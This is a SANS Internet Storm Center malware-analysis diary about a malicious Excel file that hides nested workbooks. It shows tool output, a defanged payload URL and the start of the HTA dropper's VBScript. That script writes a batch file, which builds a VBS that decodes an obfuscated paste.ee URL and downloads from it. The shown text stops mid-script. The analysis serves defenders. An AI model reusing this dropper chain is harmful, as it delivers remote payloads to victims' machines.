---
title: More Steganography&#x21;, (Sat, Jun 14th)
url: https://isc.sans.edu/diary/rss/32044
source: SANS Internet Storm Center, InfoCON: green
date: 2025-06-15
fetch_date: 2025-10-06T22:55:29.641551
---

# More Steganography&#x21;, (Sat, Jun 14th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/32038)
* [next](/diary/32048)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

# [More Steganography!](/forums/diary/More%2BSteganography/32044/)

**Published**: 2025-06-14. **Last Updated**: 2025-06-14 07:19:40 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[0 comment(s)](/diary/More%2BSteganography/32044/#comments)

I spotted another interesting file that uses, once again, steganography. It seems to be a trend (see one of my previous diaries[[1](https://isc.sans.edu/diary/A%2BPNG%2BImage%2BWith%2Ban%2BEmbedded%2BGift/31998)]). The file is an malicious Excel sheet called blcopy.xls. Office documents are rare these days because Microsoft improved the rules to allow automatic macro execution[[2](https://learn.microsoft.com/en-us/microsoft-365-apps/security/internet-macros-blocked)]. But it does not mean that Office documents can't execute malicious code. In the sample I found (SHA256:c92c761a4c5c3f44e914d6654a678953d56d4d3a2329433afe1710b59c9acd3a), there are other embedded XLS sheets:

```

remnux@remnux:~/malwarezoo/20250611$ oledump.py blcopy.xls
  1:       114 '\x01CompObj'
  2:       244 '\x05DocumentSummaryInformation'
  3:       200 '\x05SummaryInformation'
  4:       114 'MBD012124E0/\x01CompObj'
  5:       448 'MBD012124E0/\x05DocumentSummaryInformation'
  6:     27016 'MBD012124E0/\x05SummaryInformation'
  7:       114 'MBD012124E0/MBD008FCB33/\x01CompObj'
  8:     68088 'MBD012124E0/MBD008FCB33/Package'
  9:       114 'MBD012124E0/MBD008FD33C/\x01CompObj'
 10:       652 'MBD012124E0/MBD008FD33C/\x05DocumentSummaryInformation'
 11:     30228 'MBD012124E0/MBD008FD33C/\x05SummaryInformation'
 12:    218567 'MBD012124E0/MBD008FD33C/Workbook'
 13:       114 'MBD012124E0/MBD008FDB50/\x01CompObj'
 14:    111781 'MBD012124E0/MBD008FDB50/Package'
 15:       114 'MBD012124E0/MBD008FED44/\x01CompObj'
 16:    408066 'MBD012124E0/MBD008FED44/Package'
 17:    373246 'MBD012124E0/Workbook'
 18:       716 'MBD012124E1/\x01Ole'
 19:    442912 'Workbook'
 20:       525 '_VBA_PROJECT_CUR/PROJECT'
 21:       104 '_VBA_PROJECT_CUR/PROJECTwm'
 22: m     977 '_VBA_PROJECT_CUR/VBA/Sheet1'
 23: m     977 '_VBA_PROJECT_CUR/VBA/Sheet2'
 24: m     977 '_VBA_PROJECT_CUR/VBA/Sheet3'
 25: m     985 '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
 26:      2644 '_VBA_PROJECT_CUR/VBA/_VBA_PROJECT'
 27:       553 '_VBA_PROJECT_CUR/VBA/dir'

remnux@remnux:~/malwarezoo/20250611$ oledump.py blcopy.xls -s 14 -d | zipdump.py
Index Filename                                 Encrypted Timestamp
    1 [Content_Types].xml                              0 1980-01-01 00:00:00
    2 _rels/.rels                                      0 1980-01-01 00:00:00
    3 xl/_rels/workbook.xml.rels                       0 1980-01-01 00:00:00
    4 xl/workbook.xml                                  0 1980-01-01 00:00:00
    5 xl/worksheets/sheet4.xml                         0 1980-01-01 00:00:00
    6 xl/worksheets/_rels/sheet5.xml.rels              0 1980-01-01 00:00:00
    7 xl/worksheets/_rels/sheet4.xml.rels              0 1980-01-01 00:00:00
    8 xl/worksheets/_rels/sheet3.xml.rels              0 1980-01-01 00:00:00
    9 xl/worksheets/_rels/sheet2.xml.rels              0 1980-01-01 00:00:00
   10 xl/worksheets/_rels/sheet1.xml.rels              0 1980-01-01 00:00:00
   11 xl/worksheets/sheet2.xml                         0 1980-01-01 00:00:00
   12 xl/worksheets/_rels/sheet6.xml.rels              0 1980-01-01 00:00:00
   13 xl/worksheets/_rels/sheet7.xml.rels              0 1980-01-01 00:00:00
   14 xl/worksheets/_rels/sheet8.xml.rels              0 1980-01-01 00:00:00
   15 xl/worksheets/_rels/sheet13.xml.rels             0 1980-01-01 00:00:00
   16 xl/worksheets/_rels/sheet12.xml.rels             0 1980-01-01 00:00:00
   17 xl/worksheets/_rels/sheet11.xml.rels             0 1980-01-01 00:00:00
   18 xl/worksheets/_rels/sheet10.xml.rels             0 1980-01-01 00:00:00
   19 xl/worksheets/_rels/sheet9.xml.rels              0 1980-01-01 00:00:00
   20 xl/worksheets/sheet3.xml                         0 1980-01-01 00:00:00
   21 xl/worksheets/sheet1.xml                         0 1980-01-01 00:00:00
   22 xl/styles.xml                                    0 1980-01-01 00:00:00
   23 xl/worksheets/sheet11.xml                        0 1980-01-01 00:00:00
   24 xl/worksheets/sheet12.xml                        0 1980-01-01 00:00:00
   25 xl/worksheets/sheet13.xml                        0 1980-01-01 00:00:00
   26 xl/theme/theme1.xml                              0 1980-01-01 00:00:00
   27 xl/sharedStrings.xml                             0 1980-01-01 00:00:00
   28 xl/worksheets/sheet10.xml                        0 1980-01-01 00:00:00
   29 xl/worksheets/sheet8.xml                         0 1980-01-01 00:00:00
   30 xl/worksheets/sheet5.xml                         0 1980-01-01 00:00:00
   31 xl/worksheets/sheet6.xml                         0 1980-01-01 00:00:00
   32 xl/worksheets/sheet7.xml                         0 1980-01-01 00:00:00
   33 xl/worksheets/sheet9.xml                         0 1980-01-01 00:00:00
   34 xl/printerSettings/printerSettings5.bin          0 1980-01-01 00:00:00
   35 xl/printerSettings/printerSettings4.bin          0 1980-01-01 00:00:00
   36 xl/printerSettings/printerSettings2.bin          0 1980-01-01 00:00:00
   37 xl/printerSettings/printerSettings6.bin          0 1980-01-01 00:00:00
   38 xl/printerSettings/printerSettings7.bin          0 1980-01-01 00:00:00
   39 xl/printerSettings/printerSettings8.bin          0 1980-01-01 00:00:00
   40 xl/printerSettings/printerSettings9.bin          0 1980-01-01 00:00:00
   41 xl/printerSettings/printerSettings10.bin         0 1980-01-01 00:00:00
   42 xl/printerSettings/printerSettings11.bin         0 1980-01-01 00:00:00
   43 xl/printerSettings/printerSettings12.bin         0 1980-01-01 00:00:00
   44 xl/printerSettings/printerSettings13.bin         0 1980-01-01 00:00:00
   45 xl/printerSettings/printerSettings3.bin          0 1980-01-01 00:00:00
   46 xl/printerSettings/printerSettings1.bin          0 1980-01-01 00:00:00
   47 docProps/thumbnail.wmf                           0 1980-01-01 00:00:00
   48 docProps/core.xml                                0 1980-01-01 00:00:00
   49 docProps/app.xml                                 0 1980-01-01 00:00:00
```

Let's focus on the payload downloaded by this file:

```

hxxp://107[.]172[.]235[.]203/245/wecreatedbestsolutionswithniceworkingskill.hta
```

This HTA file will generate a BAT file ('C:\Windows\Temp\invertase.bat') that will generate and execute a VBS file ('C:\Windows\Temp\poikilohydric.vbs'):

```

<script language="VBScript">
  Dim adarme
  Set adarme = CreateObject("WScript.Shell")
  Dim bondwoman
  bondwoman = "C:\Windows\Temp\invertase.bat"
  Dim leucanthemum, methylamines
  Set leucanthemum = CreateObject("Scripting.FileSystemObject")
  Set methylamines = leucanthemum.CreateTextFile(bondwoman, True)
  methylamines.WriteLine "@echo off"
  methylamines.WriteLine "setlocal"
  methylamines.WriteLine "set ""fugues=C:\Windows\Temp\poikilohydric.vbs"""
  methylamines.WriteLine "echo Dim morasses, raconteur > ""%fugues%"""
  methylamines.WriteLine "echo morasses = Replace(StrReverse(""0@/@b@j@l@A@h@f@i@t@/@d@/@e@e@.@e@t@s@a@p@/@/@:@p@t@t
@h@""), ""@"", """") >> ""%fugues%"""
  methylamines.WriteLine "echo Set raconteur = CreateObject(""MSXML2.ServerXMLHTTP"") >> ""%fugues%"""
  methylamines.WriteLine "echo raconteur.open ""GET"", morasses, False >> ""%fugues%"""
  methylamines.WriteLine "echo raconteur.send >> ""...